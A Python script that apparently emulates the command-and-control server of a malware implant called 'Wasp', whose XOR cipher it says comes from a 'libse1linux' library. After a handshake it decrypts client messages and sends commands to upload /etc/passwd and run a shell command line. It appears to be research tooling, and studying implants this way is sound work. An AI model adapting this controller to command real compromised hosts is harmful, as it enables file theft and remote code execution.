#!/usr/bin/env python3

import json
import struct
from enum import Enum
import socketserver
import random


# This is used in the "Handshake" method to authenticate between clients and servers
# TODO: We should patch the binary so it uses a different value
magic_secret = struct.pack("!I", 0x75636573)

# This comes from the "SimplePassword" class in libse1linux (0fe1248ecab199bee383cef69f2de77d33b269ad1664127b366a4e745b1199c8)
cipher_bytes = b'\xf7\xe0\xc9\xb2\x9b\x84\x6d\x56\x3f\x28\x11\xf9\xe2\xcb\xb4\x9d\x86\x6f\x58\x41\x2a\x13\xfb\xe4\xcd\xb6\x9f\x88\x71\x5a\x43\x2c\x15\xfd\xe6\xcf\xb8\xa1\x8a\x73\x5c\x45\x2e\x17\x00\xe8\xd1\xba\xa3\x8c\x75\x5e\x47\x30\x19\x02\xea\xd3\xbc\xa5\x8e\x77\x60\x49\x32\x1b\x04\xec\xd5\xbe\xa7\x90\x79\x62\x4b\x34\x1d\x06\xee\xd7\xc0\xa9\x92\x7b\x64\x4d\x36\x1f\x08\xf0\xd9\xc2\xab\x94\x7d\x66\x4f\x38\x21\x0a\xf2\xdb\xc4\xad\x96\x7f\x68\x51\x3a\x23\x0c\xf4\xdd\xc6\xaf\x98\x81\x6a\x53\x3c\x25\x0e\xf6\xdf\xc8\xb1\x9a\x83\x6c\x55\x3e\x27\x10\xf8\xe1\xca\xb3\x9c\x85\x6e\x57\x40\x29\x12\xfa\xe3\xcc\xb5\x9e\x87\x70\x59\x42\x2b\x14\xfc\xe5\xce\xb7\xa0\x89\x72\x5b\x44\x2d\x16\xfe\xe7\xd0\xb9\xa2\x8b\x74\x5d\x46\x2f\x18\x01\xe9\xd2\xbb\xa4\x8d\x76\x5f\x48\x31\x1a\x03\xeb\xd4\xbd\xa6\x8f\x78\x61\x4a\x33\x1c\x05\xed\xd6\xbf\xa8\x91\x7a\x63\x4c\x35\x1e\xef\xd8\xc1\xaa\x93\x7c\x65\x4e\x37\x20\x09\xf1\xda\xc3\xac\x95\x7e\x67\x50\x39\x22\x0b\xf3\xdc\xc5\xae\x97\x80\x69\x52\x3b\x24\x0d\xf5\xde\xc7\xb0\x99\x82\x6b\x54\x3d\x26\x0f\xf7'

class WaspMethod(Enum):
    SIMPLE_CIPHER = 1
    EMPTY_CIPHER = 0

def cipher(data: bytes, offset: int = 0) -> bytes:
    encrypted_bytes = b''
    for index, b in enumerate(data):
        encrypted_value = b ^ cipher_bytes[(index + offset) % len(cipher_bytes)]
        encrypted_bytes += struct.pack('B', encrypted_value)
    return encrypted_bytes

def empty_cipher(data: bytes, offset: int = 0) -> bytes:
    print(offset)
    return data

class WaspException(Exception):
    pass

class WaspServer(socketserver.BaseRequestHandler):
    def handle(self):

        # first read one uint, compare with secret, if equal continue
        received_secret = self.request.recv(len(magic_secret))
        print(f"Received: {received_secret}")
        if received_secret != magic_secret:
            # We're talking to a Wasp!
            raise WaspException(f"This is not a Wasp! {received_secret}")

        # Read reserved field, one byte, should equal 0x0
        reserved_field = self.request.recv(1)
        print(f"Reserved field: {reserved_field}")
        # Read one byte method
        method_raw = self.request.recv(1)
        method_value, = struct.unpack('!B', method_raw)
        method = WaspMethod(method_value)


        handshake = { "uri": "handshake" }
        print("Sending handshake")

        # Now we respond
        # First the magic
        print("Sending magic")
        self.request.sendall(magic_secret)
        # Then the reserved field
        print("Sending reserved field")
        self.request.sendall(b'\x01')
        # Then the method
        print("Sending method")
        self.request.sendall(struct.pack('!B', WaspMethod.EMPTY_CIPHER.value))
        # Then the offset to use to decrypt
        command_json = json.dumps(handshake).encode('utf-8')
        encrypted_command = empty_cipher(command_json)
        encrypted_length = len(encrypted_command)
        print(f"Sending length: {encrypted_length}")
        self.request.sendall(struct.pack('!I', encrypted_length))
        print(f"Sending command: {encrypted_command}")
        self.request.sendall(encrypted_command)
        print(f"Sent handshake!")

        commands = [
            {
                "uri": "download",
                "headers": {
                    "File-Path": "/etc/passwd",
                }
            },
            {
                "uri": "command",
                "headers": {
                    "Command-Line": "/bin/touch /tmp/hello"
                }
            },
        ]
        for command in commands:
            print(f"Method: {method}")
            if method == WaspMethod.SIMPLE_CIPHER:
                # Read one byte cipher offset
                cipher_offset_raw = self.request.recv(1)
                cipher_offset, = struct.unpack("!B", cipher_offset_raw)
                print(f"Cipher offset: {cipher_offset}")
                # Read one uint JSON size
                data_size_raw = self.request.recv(4)
                data_size, = struct.unpack("!I", data_size_raw)
                print(f"Data size: {data_size}")
                # Read encrypted JSON
                encrypted_data = self.request.recv(data_size)
                print(f"Encrypted: {encrypted_data}")
                encryption_offset_delta: int = 0
                for index, key in enumerate(cipher_bytes):
                    # We use "encypted_data[0]" as this contains the crib '{'
                    result = struct.pack('B', key ^ encrypted_data[0])
                    # print(result)
                    if result == b'{':
                        print(f"Expected offset: {cipher_offset}, Actual offset: {index}")
                        encryption_offset_delta = index - cipher_offset
                        break
                decrypted_data = cipher(encrypted_data, cipher_offset + encryption_offset_delta)
                print(f"Decrypted: {decrypted_data}")
            elif method == WaspMethod.EMPTY_CIPHER:
                # Read one uint JSON size
                print(f"Attempting to read data size")
                data_size_raw = self.request.recv(4)
                data_size, = struct.unpack("!I", data_size_raw)
                print(f"Data size: {data_size}")
                # Read unencrypted JSON
                encrypted_data = self.request.recv(data_size)
                decrypted_data = empty_cipher(encrypted_data)
            else:
                raise WaspException(f"We don't understand the encryption method: {method_value}")

            data = json.loads(decrypted_data)
            print(data)


            print(f"Sending command")
            command_json = json.dumps(command).encode('utf-8')
            encrypted_command = empty_cipher(command_json)
            encrypted_length = len(encrypted_command)
            print(f"Sending length: {encrypted_length}")
            self.request.sendall(struct.pack('!I', encrypted_length))
            print(f"Sending command: {encrypted_command}")
            self.request.sendall(encrypted_command)
            print(f"Sent command!")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=7777, help='The port to listen on')
    args = parser.parse_args()
    print("Wasp ready to serve")
    with socketserver.ThreadingTCPServer(('0.0.0.0', args.port), WaspServer) as server:
        server.serve_forever()
